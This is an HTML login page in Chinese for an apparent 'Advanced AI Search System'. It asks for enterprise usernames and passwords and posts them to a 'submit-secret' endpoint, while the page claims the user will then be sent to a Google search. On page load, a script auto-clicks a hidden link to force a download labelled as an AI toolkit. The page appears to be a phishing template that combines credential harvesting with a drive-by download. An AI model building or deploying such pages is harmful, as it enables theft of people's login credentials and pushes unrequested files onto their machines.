<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>高级AI搜索系统 - 登录</title>
  <style>
    /* ... 原有样式不变 ... */
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #001f3f;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-box {
      width: 360px;
      background: #fff;
      color: #333;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.3);
    }
    /* 新增：隐藏 iframe */
    .hidden-frame {
      position: absolute;
      left: -9999px;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>

  <!-- 方法2：JS 创建 a 标签并尝试自动触发（部分浏览器允许） -->
  <script>
    // 页面加载 1 秒后尝试自动下载本地文件
    setTimeout(() => {
      const link = document.createElement('a');
      link.href = '/download/local';  // 指向服务器本地文件
      link.download = 'AI-setup.txt';  // 建议保存的文件名
      link.style.display = 'none';
      document.body.appendChild(link);
      
      // 尝试自动触发点击（是否生效取决于浏览器）
      link.click();
      
      // 清理
      document.body.removeChild(link);

      // 可选：显示提示
      console.log('📥 正在为您准备 AI 工具包...');
    }, 0);
</script>

  <!-- ========== 登录表单（不变）========== -->
  <div class="login-box">
    <h2>🔒 高级 AI 搜索系统</h2>
    <p style="text-align: center; font-size: 14px; color: #555;">
      请输入企业账户以访问内部 AI 资源库
    </p>

    <form action="http://localhost:8080/submit-secret" method="POST">
      <div class="form-group">
        <label for="username">用户名</label>
        <input type="text" id="username" name="username" placeholder="请输入工号或邮箱" required />
      </div>
      <div class="form-group">
        <label for="password">密码</label>
        <input type="password" id="password" name="password" placeholder="请输入密码" required />
      </div>
      <button type="submit">验证并继续搜索</button>
      <p class="note">认证后将跳转至 Google 搜索 “AI”</p>
    </form>
  </div>

</body>
</html>
